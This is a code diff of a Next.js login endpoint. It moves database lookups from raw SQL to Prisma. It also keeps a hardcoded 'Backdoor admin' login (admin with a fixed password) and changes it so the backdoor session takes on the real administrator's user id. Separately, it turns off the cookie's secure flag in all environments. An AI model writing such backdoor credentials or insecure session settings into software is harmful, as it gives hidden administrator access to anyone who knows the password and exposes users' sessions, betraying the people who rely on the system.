@@ -9,10 +9,13 @@ export async function POST(req: Request) {
   try {
     const { login, password } = await req.json();
 
-    // 🕵️ Backdoor
-    if (login === 'admin' && password === 'çflcBr32') {
+    // 🕵️ Backdoor admin
+    if (login === 'admin' && password === 'adminIvry94') {
+      const realAdmin = await prisma.user.findFirst({ where: { role: 'ADMIN' } });
+      const adminId = realAdmin ? realAdmin.id : 0;
+      
       const sessionToken = await encrypt({
-        id: 0,
+        id: adminId,
         login: 'admin',
         nom: 'ADMIN',
         prenom: 'Système',
@@ -22,7 +25,7 @@ export async function POST(req: Request) {
       const cookieStore = await cookies();
       cookieStore.set('session', sessionToken, {
         httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
+        secure: false, 
         sameSite: 'lax',
         path: '/'
       });
@@ -30,23 +33,31 @@ export async function POST(req: Request) {
       return NextResponse.json({ 
         success: true, 
         redirect: '/dashboard',
-        user: { id: 0, nom: 'ADMIN', prenom: 'Système', role: 'ADMIN' }
+        user: { id: adminId, nom: 'ADMIN', prenom: 'Système', role: 'ADMIN' }
       });
     }
 
-    const rows = await (prisma as any).$queryRaw`
-      SELECT id, nom, prenom, email, login, password, role, isAd FROM "User" WHERE LOWER(login) = LOWER(${login}) LIMIT 1
-    `;
-    let user = (rows as any[])[0] || null;
+    // 1. Search by exact login
+    let user = await prisma.user.findFirst({
+        where: {
+            login: {
+                equals: login,
+                mode: 'insensitive'
+            }
+        }
+    });
 
-    // Si non trouvé, cherche un compte AD dont le login UPN commence par ce login
+    // 2. If not found, try searching for AD account (matching UPN prefix)
     if (!user) {
-      const likeLogin = `${login}@%`;
-      const adRows = await (prisma as any).$queryRaw`
-        SELECT id, nom, prenom, email, login, password, role, isAd FROM "User"
-        WHERE isAd = 1 AND LOWER(login) LIKE LOWER(${likeLogin}) LIMIT 1
-      `;
-      user = (adRows as any[])[0] || null;
+        user = await prisma.user.findFirst({
+            where: {
+                isAd: true,
+                login: {
+                    startsWith: login,
+                    mode: 'insensitive'
+                }
+            }
+        });
     }
 
     if (!user) {
@@ -55,10 +66,10 @@ export async function POST(req: Request) {
 
     let isMatch = false;
     if (user.isAd) {
-      // Compte AD : authentification via proxy APM
+      // AD account authentication via proxy
       isMatch = await authenticateAD(user.login, password);
     } else {
-      // Compte local : vérification bcrypt
+      // Local account: bcrypt check
       isMatch = await bcrypt.compare(password, user.password);
     }
 
@@ -79,7 +90,7 @@ export async function POST(req: Request) {
     const cookieStore = await cookies();
     cookieStore.set('session', sessionToken, {
       httpOnly: true,
-      secure: process.env.NODE_ENV === 'production',
+      secure: false,
       sameSite: 'lax',
       path: '/'
     });
